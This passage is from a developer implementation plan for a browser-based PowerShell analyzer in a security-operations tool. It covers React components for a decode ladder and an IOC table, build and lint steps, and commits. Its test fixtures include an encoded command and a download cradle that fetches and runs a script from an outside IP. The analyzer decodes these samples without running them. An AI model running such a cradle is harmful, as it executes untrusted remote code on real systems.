{ path: '/analyzer', label: 'Analyzer', size: 'default', el: <PowerShellAnalyzer /> },
```

In `web/src/components/palette/commands.ts`, add a matching row to `DEFAULT_VIEWS` (`commands.ts:16-65`) — copy the shape of the existing `/lookup` view entry, with `path: '/analyzer'`, a label like `PowerShell analyzer`, and a short hint.

- [ ] **Step 4: Build + lint + smoke**

```bash
cd web && npm run build && npx eslint src/routes/PowerShellAnalyzer.tsx src/components/analyzer/usePsAnalysis.ts
```
Expected: build clean, no lint errors. Then `npm run dev`, open `/analyzer`, paste `powershell -nop -w hidden -enc SQBFAFgAIAAnAGgAaQAnAA==`, and confirm the JSON shows `layers[0].text` = `IEX 'hi'`.

- [ ] **Step 5: Commit**

```bash
git add web/src/routes/PowerShellAnalyzer.tsx web/src/components/analyzer/usePsAnalysis.ts web/src/App.tsx web/src/components/palette/commands.ts
git commit -m "feat(analyzer): /analyzer route + usePsAnalysis hook + nav/palette wiring"
```

---

### Task 9: Result UI — decode ladder + IOC table + the enrich bridge

Replace the JSON dump with real presentational components. The **one-click IOC → reputation card** is the whole point — each IOC row's button calls `submitLookup(raw)` (`web/src/components/palette/commands.ts:100`), which navigates to `/lookup#q=` and runs the existing enrich flow.

**Files:**
- Create: `web/src/components/analyzer/DecodeLadder.tsx`
- Create: `web/src/components/analyzer/IocTable.tsx`
- Modify: `web/src/routes/PowerShellAnalyzer.tsx` (render the components + flag chips)

**Interfaces:**
- Consumes: `AnalysisResult` (props); `submitLookup` from `../palette/commands`; `Chip`/`MicroLabel` from `@socdesk/shared/ui`.

Gate: **build + lint + manual smoke** (UI).

- [ ] **Step 1: Write `IocTable` (with the enrich bridge)**

```tsx
// web/src/components/analyzer/IocTable.tsx
import type { ExtractedIoc } from '@socdesk/shared/analyzer'
import { MicroLabel } from '@socdesk/shared/ui'
import { submitLookup } from '../palette/commands'

export function IocTable({ iocs }: { iocs: ExtractedIoc[] }) {
  if (!iocs.length) return null
  return (
    <div className="flex flex-col gap-2">
      <MicroLabel tone="muted">Indicators — one click looks them up</MicroLabel>
      <ul className="flex flex-col rounded-md border border-line">
        {iocs.map((i) => (
          <li key={i.raw} className="flex items-center gap-2 px-3 py-2 even:bg-panel-soft/40">
            <span className="w-16 shrink-0 font-mono text-micro uppercase tracking-label text-faint">{i.type}</span>
            <span className="min-w-0 flex-1 truncate font-mono text-xs text-paper">{i.defanged}</span>
            <button
              type="button"
              onClick={() => submitLookup(i.raw)}
              className="shrink-0 rounded-md border border-line px-2 py-1 font-mono text-micro font-semibold uppercase tracking-label text-muted hover:border-line-bright hover:text-paper"
            >
              Look up →
            </button>
          </li>
        ))}
      </ul>
    </div>
  )
}
```

- [ ] **Step 2: Write `DecodeLadder`**

```tsx
// web/src/components/analyzer/DecodeLadder.tsx
import type { DecodedLayer } from '@socdesk/shared/analyzer'
import { MicroLabel } from '@socdesk/shared/ui'

export function DecodeLadder({ layers }: { layers: DecodedLayer[] }) {
  if (!layers.length) return null
  return (
    <div className="flex flex-col gap-2">
      <MicroLabel tone="muted">Decode layers</MicroLabel>
      <div className="flex flex-col gap-2">
        {layers.map((l) => (
          <div key={l.index} className="rounded-md border border-line bg-panel p-3">
            <div className="flex items-center gap-2">
              <span className="font-mono text-micro text-faint">{l.index + 1}.</span>
              <span className="font-mono text-micro uppercase tracking-label text-muted">{l.transform}</span>
              <span className="ml-auto font-mono text-micro uppercase tracking-label text-faint">{l.state}</span>
            </div>
            {l.text != null && (
              <pre className="mt-2 overflow-x-auto whitespace-pre-wrap break-all font-mono text-micro text-paper">{l.text}</pre>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}
```

- [ ] **Step 3: Render them in the route (replace the JSON dump)**

In `PowerShellAnalyzer.tsx`, replace the `<pre>{JSON…}` block with:

```tsx
import { Chip } from '@socdesk/shared/ui'
import { DecodeLadder } from '../components/analyzer/DecodeLadder'
import { IocTable } from '../components/analyzer/IocTable'
// …inside the state.kind === 'ok' branch:
<div className="flex flex-col gap-4">
  {state.result.flags.length > 0 && (
    <div className="flex flex-wrap gap-1.5">
      {state.result.flags.map((f) => (
        <Chip key={f.flag} variant="neutral">{f.flag}</Chip>
      ))}
    </div>
  )}
  <DecodeLadder layers={state.result.layers} />
  <IocTable iocs={state.result.iocs} />
</div>
```

- [ ] **Step 4: Build + lint + smoke**

```bash
cd web && npm run build && npx eslint src/components/analyzer src/routes/PowerShellAnalyzer.tsx
```
Expected: clean. Then `npm run dev`, `/analyzer`, paste `IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')`, confirm the IOC row shows `hxxp://45.9.148[.]20/a.ps1`, click **Look up →**, and confirm it navigates to `/lookup` and enriches `45.9.148.20`.

- [ ] **Step 5: Commit**

```bash
git add web/src/components/analyzer/DecodeLadder.tsx web/src/components/analyzer/IocTable.tsx web/src/routes/PowerShellAnalyzer.tsx
git commit -m "feat(analyzer): decode-ladder + IOC table with one-click enrich bridge"
```

---

### Task 10: Flip the Toolbelt stub to the live route + Phase-1 close

**Files:**
- Modify: `web/src/components/views/ToolbeltView.tsx` (the stub card "Base64 decode — Decode encoded command lines…", `ToolbeltView.tsx:13-14`)

- [ ] **Step 1: Point the stub at `/analyzer`**

In `ToolbeltView.tsx`, change the "decode encoded command lines" card from a `planned` stub to a live link to `/analyzer` (follow how other live nav links are rendered in the file; keep the existing copy).

- [ ] **Step 2: Full test + build + lint sweep**

```bash
cd web && npx vitest run ../shared/analyzer && npm run build && npx eslint src/routes/PowerShellAnalyzer.tsx src/components/analyzer
```
Expected: all analyzer tests pass, build clean, no lint errors.

- [ ] **Step 3: Dogfood checkpoint (per project convention)**

`npm run dev`, walk the three fixtures: (a) `-enc` one-liner decodes; (b) plain download cradle → IOC → one-click enrich lands on `/lookup`; (c) a gzip/deflate memory-stream cradle inflates to layer 2. Confirm nothing executes and internal-hostname pastes never leave the browser (Network tab shows only the analyst-initiated `/api/enrich`).

- [ ] **Step 4: Commit**

```bash
git add web/src/components/views/ToolbeltView.tsx
git commit -m "feat(analyzer): link the Toolbelt decode card to the live /analyzer route"
```

- [ ] **Step 5: Deploy checkpoint**

Deploy per `socdesk-deploy` discipline: `git pull --rebase origin main` → `git push origin main` → `gh workflow run collect-and-deploy.yml --ref main` → verify `/analyzer` live with the `-enc` fixture. (Only on the owner's explicit go.)

---

## Phase-1 exit criteria

- Paste `-enc` / cradle PowerShell → decoded layer(s) shown with an honest state; IOCs extracted, defanged, and one-click-lookupable into the existing reputation card; nothing executed; deterministic output. All `shared/analyzer` tests green; build + lint clean.

## Follow-up plans (separate documents, gated on dogfooding Phase 1)

- **Phase 2** — recursion (depth cap 6) + the bounded constant-folder + single-assignment tracker + inline-key AES; residual/entropy + full `DecodeLadder` states (`opaque`/`wall`).
- **Phase 3** — `lolbins.ts` + `techniques.ts` signature table + co-occurrence + the **specificity-gated characterization** (Spec §6) + `TechniqueTally` + the additive `'technique'` `Chip` variant.
- **Phase 4** — `bullets.ts` action-bullet breakdown (three-tier, opaque-quarantined) + `confidence.ts` + the banned-word test.
- **Phase 5** — full copy-to-ticket (`composeCopyText` with summary + MITRE + provenance) + polish.
- **v2** — fenced, Framework-only LLM narration (Spec §13/§14).
